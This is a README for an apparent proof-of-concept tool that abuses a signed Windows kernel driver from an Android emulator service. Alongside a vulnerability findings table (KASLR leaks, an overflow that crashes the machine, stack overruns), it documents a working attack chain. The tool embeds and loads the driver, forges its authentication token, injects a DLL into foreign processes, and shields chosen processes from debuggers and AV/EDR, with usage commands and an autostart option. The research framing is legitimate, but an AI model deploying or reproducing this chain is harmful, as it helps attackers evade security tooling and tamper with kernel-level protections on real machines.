# andappsvc2_64.sys: process protection via vulnerable driver.

Proof-of-concept client for `andappsvc2_64.sys`, the process-handle protection
driver used by the Android emulator service `andappsvc2` (almost certainly used
by "AndApp"). The driver is supposed to let only its own client configure the 
protection policy. This PoC shows that the "authentication" is obfuscation: 
the token is a pure function of the driver file and an image base that the driver 
itself leaks, so any local process can promote itself to the driver's level-1 
command set, replace the protected image and use the driver as a generic 
process-shielding and KASLR-defeat primitive.

This PoC performs this sequence:

* open `\\.\Htsysm49BE01` and create a level-0 session;
* leak the driver image base and the PID hash (`0xAA023824`);
* reproduce the driver's hash chain from the `.sys` file and forge the
  authentication token (`0xAA023828`);
* register the Ob callbacks for an arbitrary image and install the policy
  (`0xAA023800`, `0xAA02380C` through `0xAA023814`);
* optionally protect a foreign process by injecting `andappsvc_payload.dll`,
  which repeats the sequence in the target's context, and poll the access log
  (`0xAA023818`).

The same executable embeds a byte-identical copy of the driver, deploys it to
`%SystemRoot%\System32\drivers`, and starts/stops the kernel service, so the PoC
is self-contained.

> Research and educational use only. This is a security research proof of
> concept for a publicly distributed driver. Do not run it on systems you do not
> own or have explicit written authorisation to test. See [Legal](#legal).

## Target

| | |
|---|---|
| File | `andappsvc2_64.sys` (31 384 bytes) |
| MD5 | `b7d34956622d0adc9242fb3f17944043` |
| SHA-256 | `09a5ca7673f3734f8987b2b4d69255ffaa05cd2e77cf2d6f72a2d6a3c91139fb` |
| Kind | Windows x64 KMDF-bound kernel-mode driver |
| Signature | Microsoft WHQL ("Microsoft Windows Hardware Compatibility Publisher") |
| Device | `\Device\Htsysm49BE01`, symlink `\DosDevices\Htsysm49BE01` → `\\.\Htsysm49BE01` |
| Interface | `METHOD_BUFFERED`, `FILE_ANY_ACCESS`, device type `0xAA02` |
| Protocol version | `1100` (`0x44C`) |

The driver calls `IoCreateDevice` with no explicit security descriptor and does
not use `IoCreateDeviceSecure`. The IOCTL interface never verifies that the
caller is the `andappsvc2` service. Every caller becomes a "session" keyed by PID
in a global 100-entry table, and the only gate between a session and the level-1
commands is the token check described below. The PoC executable runs elevated
because it deploys and starts the kernel service; the protocol itself performs no
Windows privilege check, so once the driver is loaded the same sequence works
from any process that can open the device.

## PoC attack chain

```
CreateFileW(L"\\\\.\\Htsysm49BE01")                       -> session, CommandLevel 0
DeviceIoControl(0xAA023824)                              -> pid_hash + image_base (KASLR leak)
read andappsvc2_64.sys from disk
token = HashBuffer[(pid >> 2) & 3](2, 0, &pid_hash, 4)   -> computed entirely offline
DeviceIoControl(0xAA023828, token)                       -> CommandLevel 1 (accepted)
DeviceIoControl(0xAA023800, NtImagePath)                 -> Ob callbacks + Monitored = 1
DeviceIoControl(0xAA023808)                              -> enforcement enabled
DeviceIoControl(0xAA02380C / 810 / 814, ...)             -> attacker-chosen allow-list
DeviceIoControl(0xAA023818)                              -> read back who touched the process
```

Everything needed for the token is on the machine: the driver file is readable
and the runtime image base comes from the driver itself. Once the session is at
level 1, the driver enforces a policy chosen by the caller: it strips
`PROCESS_CREATE_THREAD | PROCESS_VM_OPERATION | PROCESS_VM_READ |
PROCESS_VM_WRITE` (`DesiredAccess &= 0xFFFFFFC5`) from handles opened or
duplicated against the protected process, while the caller's own trusted PIDs
(including debuggers and AV/EDR processes, if listed) keep full access. The
access log then discloses the PIDs that attempted to touch the process.

The PoC implements this flow:

```
src/andappsvc.cpp        CreateFile + IOCTL session, auth, policy, access log
src/auth.cpp             faithful reimplementation of the driver's hash chain
src/driver_image.cpp     minimal PE32+ reader used to read the driver's .text
src/selfprotect.cpp      open -> leak -> forge token -> set policy -> keep alive
src/inject.cpp           remote LoadLibraryW + suspended launch + payload policy file
src/driver_install.cpp   embedded-driver deployment + kernel service start/stop
src/main.cpp             andappsvc_client.exe front end
payload/dllmain.cpp      andappsvc_payload.dll: the same sequence inside the target
tests/auth_vectors.cpp   pins auth.cpp against 18 vectors from the reverse engineering
```	

Reproduce it with:

```bat
:: elevated: the exe first deploys and starts the embedded driver
andappsvc_client.exe info

:: show the level-0 leaks, the driver file, its hash and the forged token
andappsvc_client.exe token

:: forge the token, install the policy and protect this process
andappsvc_client.exe self --log-interval 2000
```

Typical output of the first two commands (values from the test vectors below):

```
device          : \\.\Htsysm49BE01
protocol        : 1100 (0x44C)
caller pid      : 1234
pid hash        : 0xA7689732
image base      : 0x140000000
driver image    : C:\Windows\System32\drivers\andappsvc2_64.sys
  sha256        : 09a5ca7673f3734f8987b2b4d69255ffaa05cd2e77cf2d6f72a2d6a3c91139fb
  auth token    : 0x19131D4E (would be sent by 0xAA023828)
```

`0xAA023824` is accepted at level 0, so the leak requires nothing but a
successful `CreateFile` on the device. A wrong token permanently sets the session
to level 2 (`STATUS_UNSUCCESSFUL` for every later request). The session is keyed
by PID, so re-opening the device in a new process starts over. The token can be
computed offline before sending it.

## Security findings

Severity is from the point of view of a local process that can open the device on
a machine where the driver is loaded.

| ID | Finding | Severity |
|---|---|---|
| **F1** | `0xAA023824` returns `HashProcessId()` and the driver image base at level 0. That leaks KASLR and provides the second input to the token computation. | High |
| **F2** | The token compared by `0xAA023828` is `HashBuffer[(pid>>2)&3](2, 0, &pid_hash, 4)`, a pure function of the driver file plus the leaked image base (`g_HashSeed` = XOR of ~55 fixed RVAs, `MixTable_*` read the driver's own code bytes). The token check is obfuscation and adds no security boundary. | High |
| **F3** | `0xAA023820` (level 1) returns the kernel return address of `IrpMjDeviceControl`, i.e. an `ntoskrnl.exe` pointer and another KASLR leak. | Medium |
| **F4** | `0xAA02382C` computes `size + rva` in 32 bits; `{ rva = 0x1000, size = 0xFFFFF000 }` wraps, passes both range checks and makes the buffered-IO hasher read ~4 GiB starting at `image_base + 0x1000`, which bugchecks the machine (local DoS) and provides a slow, crash-prone memory-disclosure oracle (the IOCTL returns a 32-bit hash). | Medium |
| **F5** | `CmdSetProtectedImageName` calls `EncodeNameToDigits`, which copies 16 wchars from an uninitialised 10-wchar local into the Ob altitude suffix (kernel stack disclosure) and writes up to 33 wchars into a `WORD[8]`, overrunning adjacent stack variables. | Medium |
| **F6** | The device has no ACL and the policy is entirely caller-controlled: the first level-1 session chooses `g_ProtectedImageName` and installs the global Ob callbacks; later sessions can still overwrite the image and their own allow-lists. The driver is a generic "protect/observe process X" primitive usable as a BYOVD shield against debuggers/AV/EDR. | Medium |
| **F7** | Allow-list semantics are weak: any child of the 3 caller-supplied parent PIDs is allowed unconditionally, and the four name exceptions (`svchost.exe`, `csrss.exe`, `lsass.exe`, `conhost.exe`) are matched by short name plus an upper-cased, non-normalised full path. | Low/Medium |
| **F8** | No nonce in the challenge (the "challenge" is the public `HashProcessId`), `0xAA023828` reports `Information = 0` while writing to the system buffer, a dead status guard in `IrpMjDeviceControl`, and both Ob callbacks run their full work under a global guarded mutex. | Low |

The PoC exercises findings 1, 2 and 6: `info`/`token` show the leak and the forged
token, and `self`/`protect` install an attacker-chosen policy. `0xAA023820` and
`0xAA02382C` are exposed as diagnostics only; the F4 overflow and the F5 stack
bugs are not weaponised here.

### How the token is reconstructed

1. `0xAA023824` gives `pid_hash` and `image_base`.
2. Locate the loaded module whose base equals `image_base`
   (`EnumDeviceDrivers`, fallback `NtQuerySystemInformation(SystemModuleInformation)`)
   and read that file.
3. Reimplement the chain with the RVAs and constants in `include/andappsvc/proto.h`:
   `RecomputeHashSeed` over the driver's function addresses, 16 × `MixHashStep`
   for `HashProcessId`, the self-referential `MixTable_00..31` / `MixHash_00..15`
   mixers and the four `HashBuffer` variants, selected by `(pid >> 2) & 3`.
4. Send the resulting DWORD to `0xAA023828`.

`auth.cpp` is portable C++ (no Windows API) so the port can be validated on any
host:

```sh
./build.sh --static
./build/auth_vectors ./res/andappsvc2_64.sys
# image: preferred_base=0x140000000 size=0xE000 timestamp=0x... sha256=09a5...
# PASS base=0x140000000 pid=1234 pidhash=0xA7689732 expect=0x19131D4E got=0x19131D4E
# ...
# 18/18 vectors passed
```

The 18 vectors cover all four hasher variants and three image-base slides.

## Repository layout

```
include/andappsvc/proto.h   protocol: device name, IOCTL codes, PROC_TRACK_ENTRY, hash tables
src/driver_image.{h,cpp}    minimal PE32+ reader (+SHA-256) feeding the hash chain
src/auth.{h,cpp}            faithful reimplementation of the driver's auth hash chain
src/andappsvc.{h,cpp}       device + IOCTL client (session, auth, policy, access log)
src/selfprotect.{h,cpp}     "protect me" flow: open -> auth -> policy -> enable -> keep alive
src/driver_install.{h,cpp}  embedded-driver deployment + kernel service start/stop
src/inject.{h,cpp}          remote LoadLibrary + suspended launch + payload policy file
src/main.cpp                andappsvc_client.exe (info / token / self / protect / launch / uninstall)
res/andappsvc.rc            RCDATA #101 = the driver, RT_MANIFEST (requireAdministrator), VERSIONINFO
res/andappsvc2_64.sys       byte-identical copy of the analysed driver (embedded at build time)
payload/dllmain.cpp         andappsvc_payload.dll: runs the sequence inside the target
tests/auth_vectors.cpp      verifies the hash chain against IDB-derived vectors
```

## Build

Windows (MSVC):

```bat
build.bat --static
:: or
cmake -S . -B build -A x64 -DANDAPPSVC_STATIC_RUNTIME=ON && cmake --build build --config Release
```

Cross-check on Linux (mingw-w64, useful for CI):

```sh
./build.sh --static
```

`--static` links the C/C++ runtime statically (`/MT` with MSVC,
`-static -static-libgcc -static-libstdc++` with mingw). That matters here because
the tool is meant to be dropped on a target machine as a single file: with the
dynamic runtime the mingw build imported `libstdc++-6.dll` and
`libgcc_s_seh-1.dll`; with `--static` the import table is reduced to

```
andappsvc_client.exe : ADVAPI32.dll  KERNEL32.dll  msvcrt.dll
andappsvc_payload.dll: ADVAPI32.dll  KERNEL32.dll  msvcrt.dll
```

i.e. only DLLs that ship with Windows (the `psapi` calls resolve through
kernel32's `K32*` exports, so `psapi.dll` is not imported at all). CMake defaults
`ANDAPPSVC_STATIC_RUNTIME` to `ON`; pass `-DANDAPPSVC_STATIC_RUNTIME=OFF` (or
`build.bat --dynamic`) to opt out. Expect the binaries to grow from ~470 KB to
~2.4 MB.

Requirements: Windows x64 and Visual Studio 2022 (or mingw-w64 + CMake ≥ 3.20).

## Embedded driver installation and startup

`res/andappsvc.rc` embeds the driver as `RCDATA #101`:

```
IDR_DRIVER_PAYLOAD RCDATA "andappsvc2_64.sys"     // 31384 bytes
1 RT_MANIFEST "andappsvc.exe.manifest"            // requireAdministrator
VS_VERSION_INFO VERSIONINFO ...
```

The copy in `res/` is byte-identical to the analysed binary
(`sha256 09a5ca7673f3734f8987b2b4d69255ffaa05cd2e77cf2d6f72a2d6a3c91139fb`); the
built executable contains exactly those bytes, which you can check with any
resource viewer.

Every command that talks to the device first runs `EnsureDriverLoaded()`:

1. If `\\.\Htsysm49BE01` is already openable, there is nothing to do (the
   device is up).
2. Otherwise the RCDATA payload is extracted to
   `%SystemRoot%\System32\drivers\andappsvc2_64.sys` (fallback
   `%ProgramData%\andappsvc\andappsvc2_64.sys` when that is not writable). An
   existing file is only rewritten when its bytes differ from the payload.
3. `CreateServiceW(SERVICE_KERNEL_DRIVER, "\??\<path>", SERVICE_DEMAND_START)`;
   an existing service is reused and `ChangeServiceConfigW` fixes its image path.
4. `StartServiceW` (tolerates `ERROR_SERVICE_ALREADY_RUNNING` and re-enables a
   disabled service), then the client waits up to 5 s for
   `\Device\Htsysm49BE01` to appear, and finally opens it for its own session.

Typical output:

```
driver: deployed C:\Windows\System32\drivers\andappsvc2_64.sys (31384 bytes, embedded payload)
driver: service 'andappsvc2' created, started
session established for pid 8128
...
```

The driver has a Microsoft WHQL signature ("Microsoft Windows Hardware
Compatibility Publisher"), so it loads with Secure Boot and driver signature
enforcement enabled. Do not patch the file. The client's hash chain hashes the
`.text` of the file it finds on disk, so a modified copy breaks the
authentication too.

Useful switches:

```bat
andappsvc_client.exe self --no-install          :: assume the driver is already loaded
andappsvc_client.exe self --driver-path D:\x\andappsvc2_64.sys
andappsvc_client.exe self --service-autostart   :: register SERVICE_AUTO_START (loads at boot)
andappsvc_client.exe uninstall                  :: stop + delete the service
andappsvc_client.exe uninstall --remove-file    :: ... and delete the deployed .sys
andappsvc_client.exe self --service-name mydrv  :: use a different kernel service name
```

## Why the payload DLL exists

`ObPreOperationCallback` (RVA `0x1DF0`) looks the handle target's PID up in
`g_ProcessTable` and only enforces the policy when that entry has
`Monitored != 0`. Only IOCTL `0xAA023800`, issued by the process itself, sets
that field:

```c
nTargetPid = PsGetProcessId(OperationInfo->Object);
nIndex     = FindSessionIndexByPid(nTargetPid);      /* target must own a session */
if (nIndex != -1 && g_ProcessTable[nIndex].Monitored != 0) { ...strip access... }
```

So the driver protects the process that owns the session, not a process named by
some other process. To secure a foreign process, the client therefore injects
`andappsvc_payload.dll`, which performs the session + authentication + policy
sequence in *that* process' context. `self` mode does the same inline for the
current process. Note that the injected DLL needs the driver file on disk to
compute the token, and that the `0xAA023800` image path is global: the first
successful caller installs the Ob callbacks and later callers overwrite the image
name and their own allow-list (see F6).

## Protocol used (verified against the driver)

| IOCTL | Level | In | Out | Purpose |
|---|---|---|---|---|
| `0xAA02381C` | 0 | 0 | 4 | protocol version (`1100`) |
| `0xAA023824` | 0 | 0 | 16 | `HashProcessId()` + driver image base (KASLR leak) |
| `0xAA023828` | 0 | 4 | 0 | authenticate: `token == HashBuffer[(pid>>2)&3](2,0,&pid_hash,4)` |
| `0xAA023800` | 1 | ≥0x208 | 0 | protected image NT path + install Ob callbacks |
| `0xAA023804` / `0xAA023808` | 1 | 0 | 0 | disable / enable enforcement |
| `0xAA02380C` | 1 | 20 | 0 | 5 trusted PIDs (never blocked) |
| `0xAA023810` | 1 | 12 | 0 | 3 parent PIDs whose children are never blocked |
| `0xAA023814` | 1 | 4 | 0 | expected parent PID for `svchost.exe` |
| `0xAA023818` | 1 | 0 | 48 | drain the access log (12 slots + last denied PID) |
| `0xAA023820` | 1 | 0 | 8 | kernel return-address leak (diagnostic only) |
| `0xAA02382C` | 1 | 8 | 4 | hash of a driver `.text` range (diagnostic only) |

Level 0 is granted by `IRP_MJ_CREATE`; level 2 is a permanent rejection for that
session (re-open the device to get a fresh one).

`0xAA023800` copies the NT image path into `g_ProtectedImageName`
(`WCHAR[260]`) and, on the first successful call, registers
`ObRegisterCallbacks(PsProcessType, {CREATE, DUPLICATE})` with the driver's
pre/post callbacks. Sessions are keyed by PID in `g_ProcessTable`
(`PROC_TRACK_ENTRY[100]`, 0x70 bytes each); at most 100 sessions exist and
`IRP_MJ_CLEANUP` destroys the calling process' entry and unregisters the Ob
callbacks once the table is empty. Keep the process (and its handle) alive or the
protection disappears.

## What the protection does

* The pre-operation callback allows the access when the caller is the target
  itself, one of the 5 trusted PIDs, a child of one of the 3 blacklisted parents,
  or `svchost.exe`/`csrss.exe`/`lsass.exe`/`conhost.exe` living in the same
  directory as the protected image (`IsImageInProtectedDirectory`, which also
  requires `ExpectedParentPid` for `svchost.exe`).
* Otherwise `DesiredAccess &= 0xFFFFFFC5` removes create-thread and all VM
  read/write/operation rights, and the caller is recorded in
  `DeniedAccessPids[3]`. The post-operation callback clears that record and, if
  the handle still carries any of the stripped bits, exposes the PID through
  `LastDeniedPid` (`<pid> | 0x40000000` from `0xAA023818`).
* Callers that were allowed are recorded in `GrantedAccessPids[12]` (bit 31 =
  "protection was disabled at the time", bit 29 in slot 0 = "log full").
  `andappsvc_client.exe self` prints them as they appear.
* Because `Monitored` and `ProtectionEnabled` belong to the session owner, the
  policy can only be installed by the process that is being protected. The
  payload DLL exists to run that sequence inside a foreign process.

### Protection capabilities

The filter gives the session owner four practical capabilities: block
handle-based memory access and thread injection into the protected process, keep
selected tools working through the allow-lists, observe which PIDs request
guarded access, and switch between enforce and monitor-only at runtime. It is an
access-rights filter for process handles, not a sandbox: it does not protect
memory, threads, files or registry keys directly, and it does not deny access
outright.

#### When a request is filtered

`ObPreOperationCallback` evaluates a request only when every one of these holds:

| Condition | Implementation check |
|---|---|
| The object is a process | the callback is registered for `PsProcessType` |
| The operation is create or duplicate | `Operation == 1` or `Operation == 2` |
| The caller is a user-mode client | `KernelHandle == 0` |
| The target owns a session | `FindSessionIndexByPid(target_pid) != -1` |
| The target session is monitored | `Monitored != 0` |
| The caller is not the target | `target_pid != caller_pid` |
| The handle asks for a guarded right | `DesiredAccess & 0x3A != 0` |

Everything else passes through unchanged and is not logged. In particular,
opening the process for `PROCESS_QUERY_LIMITED_INFORMATION` or
`PROCESS_TERMINATE` alone never reaches the policy; only requests that include
one of the four thread/VM rights below are subject to the decision.

#### Allow/deny decision

For a filtered request, the callback applies the target session's policy in this
order. The first matching rule wins:

1. **Trusted PIDs.** If the caller's PID equals one of the 5 `TrustedPids`
   entries, the requested access is allowed.
2. **Parent whitelist.** If the caller's inherited-from PID
   (`PsGetProcessInheritedFromUniqueProcessId`) equals one of the 3
   `InheritedPidBlacklist` entries, access is allowed. Despite the field name,
   this is a whitelist for children of those PIDs.
3. **System-image exceptions.** The caller's short image name is compared
   byte-wise against four decoded strings:
   * `svchost.exe` is allowed only when its parent PID equals the session's
     `ExpectedParentPid` and `IsImageInProtectedDirectory` matches;
   * `csrss.exe`, `lsass.exe` and `conhost.exe` are allowed when
     `IsImageInProtectedDirectory` matches.
   `IsImageInProtectedDirectory` builds `<protected image>\<short name>`,
   upper-cases both that string and the caller's `ProcessImageFileName`, and
   compares them. It matches only a sibling of the protected image with the same
   short name; the comparison is case-insensitive but not normalised, and a
   failed `ZwQueryInformationProcess` returns false (no exception).
4. **Deny.** Otherwise the requested access is masked:

| Right | Value | After the filter |
|---|---:|---|
| `PROCESS_CREATE_THREAD` | `0x0002` | cleared |
| `PROCESS_VM_OPERATION` | `0x0008` | cleared |
| `PROCESS_VM_READ` | `0x0010` | cleared |
| `PROCESS_VM_WRITE` | `0x0020` | cleared |
| all other rights (`PROCESS_TERMINATE`, `PROCESS_DUP_HANDLE`, `PROCESS_QUERY_INFORMATION`, `PROCESS_SET_INFORMATION`, `PROCESS_SUSPEND_RESUME`, ...) | | kept |

The implementation is `DesiredAccess &= 0xFFFFFFC5` (`~0x3A`). A denied caller
is recorded in `DeniedAccessPids[3]` (first free slot; if all 3 are full the
record is dropped), while the handle is still returned with the remaining
rights.

#### Policy controls

All policy IOCTLs are level 1 and, apart from the global image path and the
one-time callback registration, affect only the caller's own session entry. That
entry is the one consulted when a handle targets the caller's process:

| IOCTL | Effect on the caller's `PROC_TRACK_ENTRY` |
|---|---|
| `0xAA023800` | stores the NT image path in the global `g_ProtectedImageName`, sets `ProtectionEnabled = 1` and `Monitored = 1`, and installs the Ob registration if none exists yet |
| `0xAA023804` | clears `ProtectionEnabled`: no masking, but allowed accesses are still logged with bit 31 |
| `0xAA023808` | sets `ProtectionEnabled = 1`: resumes masking |
| `0xAA02380C` | replaces `TrustedPids[5]` (20 input bytes) |
| `0xAA023810` | replaces `InheritedPidBlacklist[3]` (12 input bytes) |
| `0xAA023814` | sets `ExpectedParentPid` (4 input bytes) |
| `0xAA023818` | drains the access log (48 output bytes, described below) |

The Ob registration covers `CREATE | DUPLICATE`, uses a `88180.`-prefixed
altitude and both callbacks, and at most one registration exists at a time. It
is removed when the session table becomes empty.

#### Access log

The per-session log is the driver's observation capability:

* `GrantedAccessPids[12]` records up to 12 distinct caller PIDs whose filtered
  handle access was allowed. An entry gets bit 31 set when the record was made
  while `ProtectionEnabled == 0`; when all slots are full, slot 0 gets bit 29
  and further grants are not recorded. A duplicate grant for an already recorded
  PID does not add another slot.
* `DeniedAccessPids[3]` holds up to 3 PIDs whose access was stripped between the
  pre- and post-callbacks. The post-callback clears each matching slot; if the
  finally granted handle still contains any of the four guarded bits, it also
  sets `LastDeniedPid` to that PID. Because the pre-callback normally removes
  those bits before the post-callback runs, this marker is not the primary
  record of a denial.
* `0xAA023818` copies the 12 grant slots to user mode, clears them, then, if
  `LastDeniedPid` is non-zero, writes it as `<pid> | 0x40000000` into the first
  zero slot and clears it.

#### Scope and lifetime

* `Monitored`, `ProtectionEnabled`, the allow-lists and the log are fields of the
  target's session, and the callback consults the target's entry. Protection is
  therefore self-installed; the payload DLL exists to run that sequence inside a
  foreign process.
* Several sessions can be monitored at once, each with its own allow-lists and
  log. `g_ProtectedImageName`, however, is global: a later `0xAA023800` from
  another authenticated session replaces the path used by all sessions' image
  exceptions.
* At most 100 sessions exist (one per PID). `IRP_MJ_CLEANUP` zeroes the session
  and unregisters the Ob callbacks once the table is empty; `DriverUnload` does
  the same. Keeping the process and its device handle alive is required for the
  filter to stay installed, and there is no IOCTL that clears `Monitored` for a
  live session.
* The filter applies to new and duplicated handles only. Handles that were
  already open with full access keep it, and the mask is not a full deny: the
  target can still be queried, have its information changed, suspended/resumed,
  terminated, or have handles duplicated. When `ProtectionEnabled == 0`, the
  driver masks nothing but still records allowed access attempts, which makes
  the disabled state a passive monitor mode.
* Both callbacks run under `g_ProcessTableLock`, serialising the decision and
  the log updates.

## Usage

Requirements: Windows x64 and an elevated prompt. The embedded manifest asks for
`requireAdministrator` because deploying a kernel driver and starting its service
require it. The driver is embedded, so there is nothing to copy around: the
client deploys and starts it on launch and locates the resulting file
automatically for the hash chain (`--driver-image` overrides it).

```bat
:: install + start the embedded driver, then show what it exposes
andappsvc_client.exe info

:: prove the auth chain for this process (offline, no state change)
andappsvc_client.exe token

:: protect this very process; poll the access log every 2 s
andappsvc_client.exe self --log-interval 2000

:: protect this process, whitelist the shell and the parent, run 60 s
andappsvc_client.exe self --trusted 1234,5678 --blacklist 4321 --duration 60

:: protect an already running process (injects the payload, keeps a log)
andappsvc_client.exe protect --pid 4242 --log C:\Windows\Temp\target.log

:: start a process protected
andappsvc_client.exe launch --exe "C:\Games\App\app.exe" -- --windowed --no-splash

:: level-1 diagnostics: hash a .text range (e.g. the whole module)
andappsvc_client.exe self --hash-range 0x1000:0x3220 --once
```

`protect`/`launch` write `andappsvc_policy.ini` next to the payload DLL; the
payload reads it at load time:

```ini
image=\Device\HarddiskVolume3\Games\App\app.exe   ; default: the target's own image
trusted=1234,5678
blacklist=4321
expected_parent=999
enable=1
log=C:\Windows\Temp\target.log
```

Everything the payload logs (authentication result, every recorded handle access)
goes to `log=` and to the debugger output.

## Notes and limitations

* One driver session per PID. A second `CreateFile` in the same process fails
  (`STATUS_UNSUCCESSFUL`); a wrong token locks that session at level 2, so just
  reopen the device to start over.
* Only one Ob registration exists globally (`g_ObRegistrationHandle`). The first
  successful `0xAA023800` installs it, and later callers can still overwrite
  `g_ProtectedImageName` and their own entry.
* The protected image path must use the NT form (`\Device\HarddiskVolumeN\…`)
  because the driver compares it against `ZwQueryInformationProcess(
  ProcessImageFileName)`. The client derives it with
  `NtQueryInformationProcess` and can translate other NT forms to Win32 paths.
* The client deliberately uses `0xAA023824`/`0xAA023828` only as far as the
  authentication requires; `0xAA023820`/`0xAA02382C` are exposed only as
  diagnostics, and the overflow / stack bugs are not used here.
* Injection needs `PROCESS_CREATE_THREAD|VM_OPERATION|VM_WRITE` on the target and
  a target that permits `LoadLibraryW` (no protected-process/CIG targets).

## Legal

This repository contains security research code and a copy of a third-party,
signed kernel driver. It is provided for analysis and defensive research on
systems you own or are explicitly authorised to test. Running it may violate
the target's terms of service, anti-cheat rules, or local law. The authors take
no responsibility for misuse or damage. Redistribution of the embedded driver is
subject to the original vendor's licence; the PoC code itself is provided under
the terms you choose for this repository.
